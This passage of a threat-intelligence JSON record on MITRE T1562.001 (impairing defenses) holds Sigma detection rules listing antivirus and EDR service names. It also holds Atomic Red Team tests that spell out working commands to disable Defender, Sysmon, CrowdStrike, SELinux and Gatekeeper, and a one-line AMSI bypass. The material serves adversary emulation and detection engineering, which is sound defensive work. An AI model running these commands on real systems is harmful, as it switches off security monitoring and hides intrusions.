attack.defense_evasion\n- attack.t1562.001\ntitle: Windows Defender Exploit Guard Tamper\n",
                            "sigma:id": "a3ab73f1-bd46-4319-8f06-4b20d0617886",
                            "title": "Windows Defender Exploit Guard Tamper",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fe34868f-6e0e-4882-81f6-c43aa8f15b62",
                        "lookup_data": {
                            "description": "Detects disabling Windows Defender threat protection",
                            "raw": "author: \"J\\xE1n Tren\\u010Dansk\\xFD, frack113\"\ndate: 2020/07/28\ndescription: Detects disabling Windows Defender threat protection\ndetection:\n  condition: selection\n  selection:\n    EventID:\n    - 5001\n    - 5010\n    - 5012\n    - 5101\nfalsepositives:\n- Administrator actions (should be investigated)\nid: fe34868f-6e0e-4882-81f6-c43aa8f15b62\nlevel: high\nlogsource:\n  product: windows\n  service: windefend\nmodified: 2022/12/06\nreferences:\n- https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-antivirus/troubleshoot-windows-defender-antivirus\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\nstatus: stable\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Windows Defender Threat Detection Disabled\n",
                            "sigma:id": "fe34868f-6e0e-4882-81f6-c43aa8f15b62",
                            "title": "Windows Defender Threat Detection Disabled",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ff39f1a6-84ac-476f-a1af-37fcdf53d7c0",
                        "lookup_data": {
                            "description": "Detects disabling security tools",
                            "raw": "author: Daniil Yugoslavskiy, oscd.community\ndate: 2020/10/19\ndescription: Detects disabling security tools\ndetection:\n  condition: (launchctl_unload and security_plists) or disable_gatekeeper\n  disable_gatekeeper:\n    CommandLine|contains: disable\n    Image: /usr/sbin/spctl\n  launchctl_unload:\n    CommandLine|contains: unload\n    Image: /bin/launchctl\n  security_plists:\n    CommandLine|contains:\n    - com.objective-see.lulu.plist\n    - com.objective-see.blockblock.plist\n    - com.google.santad.plist\n    - com.carbonblack.defense.daemon.plist\n    - com.carbonblack.daemon.plist\n    - at.obdev.littlesnitchd.plist\n    - com.tenablesecurity.nessusagent.plist\n    - com.opendns.osx.RoamingClientConfigUpdater.plist\n    - com.crowdstrike.falcond.plist\n    - com.crowdstrike.userdaemon.plist\n    - osquery\n    - filebeat\n    - auditbeat\n    - packetbeat\n    - td-agent\nfalsepositives:\n- Legitimate activities\nid: ff39f1a6-84ac-476f-a1af-37fcdf53d7c0\nlevel: medium\nlogsource:\n  category: process_creation\n  product: macos\nmodified: 2021/11/27\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Disable Security Tools\n",
                            "sigma:id": "ff39f1a6-84ac-476f-a1af-37fcdf53d7c0",
                            "title": "Disable Security Tools",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "7fd4bb39-12d0-45ab-bb36-cebabc73dc7b",
                        "lookup_data": {
                            "description": "Detects when attackers use \"sc.exe\" to delete AV services from the system in order to avoid detection",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/01\ndescription: Detects when attackers use \"sc.exe\" to delete AV services from the system\n  in order to avoid detection\ndetection:\n  condition: all of selection*\n  selection_av_process:\n    CommandLine|contains:\n    - AvgAdminServer\n    - AVG Antivirus\n    - MBEndpointAgent\n    - MBAMService\n    - MBCloudEA\n    - avgAdminClient\n    - SAVService\n    - SAVAdminService\n    - Sophos AutoUpdate Service\n    - Sophos Clean Service\n    - Sophos Device Control Service\n    - Sophos File Scanner Service\n    - Sophos Health Service\n    - Sophos MCS Agent\n    - Sophos MCS Client\n    - SntpService\n    - swc_service\n    - swi_service\n    - Sophos UI\n    - swi_update\n    - Sophos Web Control Service\n    - Sophos System Protection Service\n    - Sophos Safestore Service\n    - hmpalertsvc\n    - RpcEptMapper\n    - Sophos Endpoint Defense Service\n    - SophosFIM\n    - swi_filter\n    - FirebirdGuardianDefaultInstance\n    - FirebirdServerDefaultInstance\n    - WRSVC\n    - ekrn\n    - ekrnEpsw\n    - klim6\n    - AVP18.0.0\n    - KLIF\n    - klpd\n    - klflt\n    - klbackupdisk\n    - klbackupflt\n    - klkbdflt\n    - klmouflt\n    - klhk\n    - KSDE1.0.0\n    - kltap\n    - ScSecSvc\n    - Core Mail Protection\n    - Core Scanning Server\n    - Core Scanning ServerEx\n    - Online Protection System\n    - RepairService\n    - Core Browsing Protection\n    - Quick Update Service\n    - McAfeeFramework\n    - macmnsvc\n    - masvc\n    - mfemms\n    - mfevtp\n    - TmFilter\n    - TMLWCSService\n    - tmusa\n    - TmPreFilter\n    - TMSmartRelayService\n    - TMiCRCScanService\n    - VSApiNt\n    - TmCCSF\n    - tmlisten\n    - TmProxy\n    - ntrtscan\n    - ofcservice\n    - TmPfw\n    - PccNTUpd\n    - PandaAetherAgent\n    - PSUAService\n    - NanoServiceMain\n    - EPIntegrationService\n    - EPProtectedService\n    - EPRedline\n    - EPSecurityService\n    - EPUpdateService\n  selection_cli:\n    CommandLine|contains: ' delete '\n  selection_img:\n  - Image|endswith: \\sc.exe\n  - OriginalFileName: sc.exe\nfalsepositives:\n- Legitimate software deleting using the same method of deletion (Add it to a filter\n  if you find cases as such)\nid: 7fd4bb39-12d0-45ab-bb36-cebabc73dc7b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://www.virustotal.com/gui/file/38283b775552da8981452941ea74191aa0d203edd3f61fb2dee7b0aea3514955\nstatus: experimental\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Suspicious Execution of Sc to Delete AV Services\n",
                            "sigma:id": "7fd4bb39-12d0-45ab-bb36-cebabc73dc7b",
                            "title": "Suspicious Execution of Sc to Delete AV Services",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "8dbeaaac-a671-4a02-8dab-5eec2a1c935b",
                        "lookup_data": {
                            "description": "Ragnar Locker Ransomware Targeting the Energy Sector",
                            "link": "http://www.botvrij.eu/data/feed-osint/8dbeaaac-a671-4a02-8dab-5eec2a1c935b.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1662991697",
                            "uuid": "8dbeaaac-a671-4a02-8dab-5eec2a1c935b",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "919f2ef0-be2d-4a7a-b635-eb2b41fde044",
                        "lookup_data": {
                            "description": "Detects the addition of a key 'MiniNt' to the registry. Upon a reboot, Windows Event Log service will stopped write events.",
                            "raw": "author: Ilyas Ochkov, oscd.community\ndate: 2019/10/25\ndescription: Detects the addition of a key 'MiniNt' to the registry. Upon a reboot,\n  Windows Event Log service will stopped write events.\ndetection:\n  condition: selection\n  selection:\n  - EventType: CreateKey\n    TargetObject: HKLM\\SYSTEM\\CurrentControlSet\\Control\\MiniNt\n  - NewName: HKLM\\SYSTEM\\CurrentControlSet\\Control\\MiniNt\nfalsepositives:\n- Unknown\nfields:\n- EventID\n- Image\n- TargetObject\n- NewName\nid: 919f2ef0-be2d-4a7a-b635-eb2b41fde044\nlevel: high\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://twitter.com/0gtweet/status/1182516740955226112\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\n- attack.t1112\ntitle: Disable Security Events Logging Adding Reg Key MiniNt\n",
                            "sigma:id": "919f2ef0-be2d-4a7a-b635-eb2b41fde044",
                            "title": "Disable Security Events Logging Adding Reg Key MiniNt",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d3abac66-f11c-4ed0-8acb-50cc29c97eed",
                        "lookup_data": {
                            "description": "Detects NetNTLM downgrade attack",
                            "raw": "author: Florian Roth (Nextron Systems), wagga\ndate: 2018/03/20\ndescription: Detects NetNTLM downgrade attack\ndetection:\n  condition: selection\n  selection:\n    EventID: 4657\n    ObjectName|contains|all:\n    - \\REGISTRY\\MACHINE\\SYSTEM\n    - ControlSet\n    - \\Control\\Lsa\n    ObjectValueName:\n    - LmCompatibilityLevel\n    - NtlmMinClientSec\n    - RestrictSendingNTLMTraffic\nfalsepositives:\n- Unknown\nid: d3abac66-f11c-4ed0-8acb-50cc29c97eed\nlevel: high\nlogsource:\n  definition: 'Requirements: Audit Policy : Object Access > Audit Registry (Success)'\n  product: windows\n  service: security\nmodified: 2022/10/09\nreferences:\n- https://www.optiv.com/blog/post-exploitation-using-netntlm-downgrade-attacks\nrelated:\n- id: d67572a0-e2ec-45d6-b8db-c100d14b8ef2\n  type: derived\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1562.001\n- attack.t1112\ntitle: NetNTLM Downgrade Attack\n",
                            "sigma:id": "d3abac66-f11c-4ed0-8acb-50cc29c97eed",
                            "title": "NetNTLM Downgrade Attack",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4a6713f6-3331-11ed-a261-0242ac120002",
                        "lookup_data": {
                            "description": "Detects one of the possible scenarios for disabling symantec endpoint protection.\nSymantec Endpoint Protection antivirus software services incorrectly implement the protected service mechanism.\nAs a result, the NT AUTHORITY/SYSTEM user can execute the taskkill /im command several times ccSvcHst.exe /f, thereby killing the process belonging to the service, and thus shutting down the service.\n",
                            "raw": "author: Ilya Krestinichev, Florian Roth\ndate: 2022/09/13\ndescription: 'Detects one of the possible scenarios for disabling symantec endpoint\n  protection.\n\n  Symantec Endpoint Protection antivirus software services incorrectly implement the\n  protected service mechanism.\n\n  As a result, the NT AUTHORITY/SYSTEM user can execute the taskkill /im command several\n  times ccSvcHst.exe /f, thereby killing the process belonging to the service, and\n  thus shutting down the service.\n\n  '\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - taskkill\n    - ' /F '\n    - ' /IM '\n    - ccSvcHst.exe\nfalsepositives:\n- Unknown\nid: 4a6713f6-3331-11ed-a261-0242ac120002\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://www.exploit-db.com/exploits/37525\n- https://community.spiceworks.com/topic/2195015-batch-script-to-uninstall-symantec-endpoint-protection\n- https://community.broadcom.com/symantecenterprise/communities/community-home/digestviewer/viewthread?MessageKey=6ce94b67-74e1-4333-b16f-000b7fd874f0&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=digestviewer\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Taskkill Symantec Endpoint Protection\n",
                            "sigma:id": "4a6713f6-3331-11ed-a261-0242ac120002",
                            "title": "Taskkill Symantec Endpoint Protection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "6783aa9e-0dc3-49d4-a94a-8b39c5fd700b",
                        "lookup_data": {
                            "description": "Detects usage of 'Stop-Service' or 'Remove-Service' powershell cmdlet to disable AV services.\nAdversaries may disable security tools to avoid possible detection of their tools and activities by stopping antivirus service\n",
                            "raw": "author: frack113\ndate: 2021/07/07\ndescription: 'Detects usage of ''Stop-Service'' or ''Remove-Service'' powershell cmdlet\n  to disable AV services.\n\n  Adversaries may disable security tools to avoid possible detection of their tools\n  and activities by stopping antivirus service\n\n  '\ndetection:\n  condition: all of selection*\n  selection_action:\n    CommandLine|contains:\n    - 'Stop-Service '\n    - 'Remove-Service '\n  selection_product:\n    CommandLine|contains:\n    - ' McAfeeDLPAgentService'\n    - ' Trend Micro Deep Security Manager'\n    - ' TMBMServer'\n    - Sophos\n    - Symantec\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- User\n- CommandLine\n- ParentCommandLine\nid: 6783aa9e-0dc3-49d4-a94a-8b39c5fd700b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/22\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md\n- https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.001\ntitle: Stop Or Remove Antivirus Service\n",
                            "sigma:id": "6783aa9e-0dc3-49d4-a94a-8b39c5fd700b",
                            "title": "Stop Or Remove Antivirus Service",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1562.001",
                "display_name": "Impair Defenses: Disable or Modify Tools",
                "atomic_tests": [
                    {
                        "name": "Disable syslog",
                        "auto_generated_guid": "4ce786f8-e601-44b5-bfae-9ebb15a7d1c8",
                        "description": "Disables syslog collection\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "package_checker": {
                                "description": "Package checking command for linux.",
                                "type": "string",
                                "default": "(rpm -q rsyslog 2>&1 >/dev/null) || (dpkg -s rsyslog | grep -q installed)"
                            },
                            "package_installer": {
                                "description": "Package installer command for linux. Default yum",
                                "type": "string",
                                "default": "(which yum && yum -y install epel-release rsyslog)||(which apt-get && apt-get install -y rsyslog)"
                            },
                            "flavor_command": {
                                "description": "Command to disable syslog collection. Default newer rsyslog commands. i.e older command = service rsyslog stop ; chkconfig off rsyslog",
                                "type": "string",
                                "default": "systemctl stop rsyslog ; systemctl disable rsyslog"
                            },
                            "cleanup_command": {
                                "description": "Command to enable syslog collection. Default newer rsyslog commands. i.e older command = service rsyslog start ; chkconfig rsyslog on",
                                "type": "string",
                                "default": "systemctl start rsyslog ; systemctl enable rsyslog"
                            }
                        },
                        "dependency_executor_name": "sh",
                        "dependencies": [
                            {
                                "description": "Package with rsyslog must be on system\n",
                                "prereq_command": "if #{package_checker} > /dev/null; then exit 0; else exit 1; fi\n",
                                "get_prereq_command": "sudo #{package_installer} \n"
                            }
                        ],
                        "executor": {
                            "command": "#{flavor_command}\n",
                            "cleanup_command": "#{cleanup_command}\n",
                            "name": "sh",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable syslog (freebsd)",
                        "auto_generated_guid": "db9de996-441e-4ae0-947b-61b6871e2fdf",
                        "description": "Disables syslog collection\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "executor": {
                            "command": "service syslogd stop\nsysrc syslogd_enable=\"NO\"\n",
                            "cleanup_command": "sysrc syslogd_enable=\"YES\"\nservice syslogd start\n",
                            "name": "sh",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Cb Response",
                        "auto_generated_guid": "ae8943f7-0f8d-44de-962d-fbc2e2f03eb8",
                        "description": "Disable the Cb Response service\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "executor": {
                            "command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service cbdaemon stop\n  chkconfig off cbdaemon\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop cbdaemon\n  systemctl disable cbdaemon\nfi\n",
                            "name": "sh"
                        }
                    },
                    {
                        "name": "Disable SELinux",
                        "auto_generated_guid": "fc225f36-9279-4c39-b3f9-5141ab74f8d8",
                        "description": "Disables SELinux enforcement\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "dependencies": [
                            {
                                "description": "SELinux must be installed\n",
                                "prereq_command": "which setenforce\n",
                                "get_prereq_command": "echo \"SELinux is not installed\"; exit 1\n"
                            }
                        ],
                        "executor": {
                            "command": "setenforce 0\n",
                            "cleanup_command": "setenforce 1\n",
                            "name": "sh",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Stop Crowdstrike Falcon on Linux",
                        "auto_generated_guid": "828a1278-81cc-4802-96ab-188bf29ca77d",
                        "description": "Stop and disable Crowdstrike Falcon on Linux\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "executor": {
                            "command": "sudo systemctl stop falcon-sensor.service\nsudo systemctl disable falcon-sensor.service\n",
                            "cleanup_command": "sudo systemctl enable falcon-sensor.service\nsudo systemctl start falcon-sensor.service\n",
                            "name": "sh",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Carbon Black Response",
                        "auto_generated_guid": "8fba7766-2d11-4b4a-979a-1e3d9cc9a88c",
                        "description": "Disables Carbon Black Response\n",
                        "supported_platforms": [
                            "macos"
                        ],
                        "executor": {
                            "command": "sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist\nsudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist\n",
                            "cleanup_command": "sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.daemon.plist\nsudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist\n",
                            "name": "sh",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable LittleSnitch",
                        "auto_generated_guid": "62155dd8-bb3d-4f32-b31c-6532ff3ac6a3",
                        "description": "Disables LittleSnitch\n",
                        "supported_platforms": [
                            "macos"
                        ],
                        "executor": {
                            "command": "sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n",
                            "cleanup_command": "sudo launchctl load -w /Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n",
                            "name": "sh",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable OpenDNS Umbrella",
                        "auto_generated_guid": "07f43b33-1e15-4e99-be70-bc094157c849",
                        "description": "Disables OpenDNS Umbrella\n",
                        "supported_platforms": [
                            "macos"
                        ],
                        "executor": {
                            "command": "sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n",
                            "cleanup_command": "sudo launchctl load -w /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n",
                            "name": "sh",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable macOS Gatekeeper",
                        "auto_generated_guid": "2a821573-fb3f-4e71-92c3-daac7432f053",
                        "description": "Disables macOS Gatekeeper\n",
                        "supported_platforms": [
                            "macos"
                        ],
                        "executor": {
                            "command": "sudo spctl --master-disable\n",
                            "cleanup_command": "sudo spctl --master-enable\n",
                            "name": "sh",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Stop and unload Crowdstrike Falcon on macOS",
                        "auto_generated_guid": "b3e7510c-2d4c-4249-a33f-591a2bc83eef",
                        "description": "Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS\n",
                        "supported_platforms": [
                            "macos"
                        ],
                        "input_arguments": {
                            "falcond_plist": {
                                "description": "The path of the Crowdstrike Falcon plist file",
                                "type": "path",
                                "default": "/Library/LaunchDaemons/com.crowdstrike.falcond.plist"
                            },
                            "userdaemon_plist": {
                                "description": "The path of the Crowdstrike Userdaemon plist file",
                                "type": "path",
                                "default": "/Library/LaunchDaemons/com.crowdstrike.userdaemon.plist"
                            }
                        },
                        "executor": {
                            "command": "sudo launchctl unload #{falcond_plist}\nsudo launchctl unload #{userdaemon_plist}\n",
                            "cleanup_command": "sudo launchctl load -w #{falcond_plist}\nsudo launchctl load -w #{userdaemon_plist}\n",
                            "name": "sh",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Unload Sysmon Filter Driver",
                        "auto_generated_guid": "811b3e76-c41b-430c-ac0d-e2380bfaa164",
                        "description": "Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution,\nrun the prereq_command's and it should fail with an error of \"sysmon filter must be loaded\".\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "sysmon_driver": {
                                "description": "The name of the Sysmon filter driver (this can change from the default)",
                                "type": "string",
                                "default": "SysmonDrv"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Sysmon must be downloaded\n",
                                "prereq_command": "if ((cmd.exe /c \"where.exe Sysmon.exe 2> nul | findstr /i Sysmon 2> nul\") -or (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\")) { exit 0 } else { exit 1 }\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Sysmon.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\" -Force\n"
                            },
                            {
                                "description": "sysmon must be Installed\n",
                                "prereq_command": "if(sc.exe query sysmon | findstr sysmon) { exit 0 } else { exit 1 }\n",
                                "get_prereq_command": "if(cmd.exe /c \"where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul\") { C:\\Windows\\Sysmon.exe -accepteula -i } else\n{ & \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -accepteula -i}\n"
                            },
                            {
                                "description": "sysmon filter must be loaded\n",
                                "prereq_command": "if(fltmc.exe filters | findstr #{sysmon_driver}) { exit 0 } else { exit 1 }\n",
                                "get_prereq_command": "if(Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\"){\n  & \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -u\n  & \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -accepteula -i\n}else{\n  sysmon -u\n  sysmon -accepteula -i\n}\n"
                            }
                        ],
                        "executor": {
                            "command": "fltmc.exe unload #{sysmon_driver}\n",
                            "cleanup_command": "sysmon -u -i > nul 2>&1\nsysmon -i -accepteula -i > nul 2>&1\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -u > nul 2>&1\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -accepteula -i > nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Uninstall Sysmon",
                        "auto_generated_guid": "a316fb2e-5344-470d-91c1-23e15c374edc",
                        "description": "Uninstall Sysinternals Sysmon for Defense Evasion\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "sysmon_exe": {
                                "description": "The location of the Sysmon executable from Sysinternals (ignored if sysmon.exe is found in your PATH)",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\T1562.001\\bin\\sysmon.exe"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Sysmon executable must be available\n",
                                "prereq_command": "if(cmd /c where sysmon) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "$parentpath = Split-Path \"#{sysmon_exe}\"; $zippath = \"$parentpath\\Sysmon.zip\"\nNew-Item -ItemType Directory $parentpath -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Sysmon.zip\" -OutFile \"$zippath\"\nExpand-Archive $zippath $parentpath -Force; Remove-Item $zippath\nif(-not ($Env:Path).contains($parentpath)){$Env:Path += \";$parentpath\"}\n"
                            },
                            {
                                "description": "Sysmon must be installed\n",
                                "prereq_command": "if(cmd /c sc query sysmon) { exit 0} else { exit 1}\n",
                                "get_prereq_command": "cmd /c sysmon -i -accepteula\n"
                            }
                        ],
                        "executor": {
                            "command": "sysmon -u\n",
                            "cleanup_command": "sysmon -i -accepteula >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "AMSI Bypass - AMSI InitFailed",
                        "auto_generated_guid": "695eed40-e949-40e5-b306-b4031e4154bd",
                        "description": "Any easy way to bypass AMSI inspection is it patch the dll in memory setting the \"amsiInitFailed\" function to true.\nUpon execution, no output is displayed.\n\nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n",
                            "cleanup_command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "AMSI Bypass - Remove AMSI Provider Reg Key",
                        "auto_generated_guid": "13f09b91-c953-438e-845b-b585e51cac9b",
                        "description": "With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis test removes the Windows Defender provider registry key. Upon execution, no output is displayed.\nOpen Registry Editor and navigate to \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\\" to verify that it is gone.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse\n",
                            "cleanup_command": "New-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\" -Name \"{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -ErrorAction Ignore | Out-Null\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Arbitrary Security Windows Service",
                        "auto_generated_guid": "a1230893-56ac-4c81-b644-2108e982f8f5",
                        "description": "With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.\nChange the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.\nTo verify that the service has stopped, run \"sc query McAfeeDLPAgentService\"\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "service_name": {
                                "description": "The name of the service to stop",
                                "type": "string",
                                "default": "McAfeeDLPAgentService"
                            }
                        },
                        "executor": {
                            "command": "net.exe stop #{service_name}\nsc.exe config #{service_name} start= disabled\n",
                            "cleanup_command": "sc.exe config #{service_name} start= auto >nul 2>&1\nnet.exe start #{service_name} >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Tamper with Windows Defender ATP PowerShell",
                        "auto_generated_guid": "6b8df440-51ec-4d53-bf83-899591c9b5d7",
                        "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "Set-MpPreference -DisableRealtimeMonitoring 1\nSet-MpPreference -DisableBehaviorMonitoring 1\nSet-MpPreference -DisableScriptScanning 1\nSet-MpPreference -DisableBlockAtFirstSeen 1\n",
                            "cleanup_command": "Set-MpPreference -DisableRealtimeMonitoring 0\nSet-MpPreference -DisableBehaviorMonitoring 0\nSet-MpPreference -DisableScriptScanning 0\nSet-MpPreference -DisableBlockAtFirstSeen 0\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Tamper with Windows Defender Command Prompt",
                        "auto_generated_guid": "aa875ed4-8935-47e2-b2c5-6ec00ab220d2",
                        "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.\nHowever, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, \"Access Denied\"\nwill be displayed twice and the WinDefend service status will be displayed.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "sc stop WinDefend\nsc config WinDefend start=disabled\nsc query WinDefend\n",
                            "cleanup_command": "sc start WinDefend >nul 2>&1\nsc config WinDefend start=enabled >nul 2>&1\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Tamper with Windows Defender Registry",
                        "auto_generated_guid": "1b3e0146-a1e5-4c5c-89fb-1bb2ffe8fc45",
                        "description": "Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be\ngrayed out and have no info.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1\n",
                            "cleanup_command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 0\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Microsoft Office Security Features",
                        "auto_generated_guid": "6f5fb61b-4e56-4a3d-a8c3-82e13686c6d7",
                        "description": "Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not\nshow any warning before editing the document.\n\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
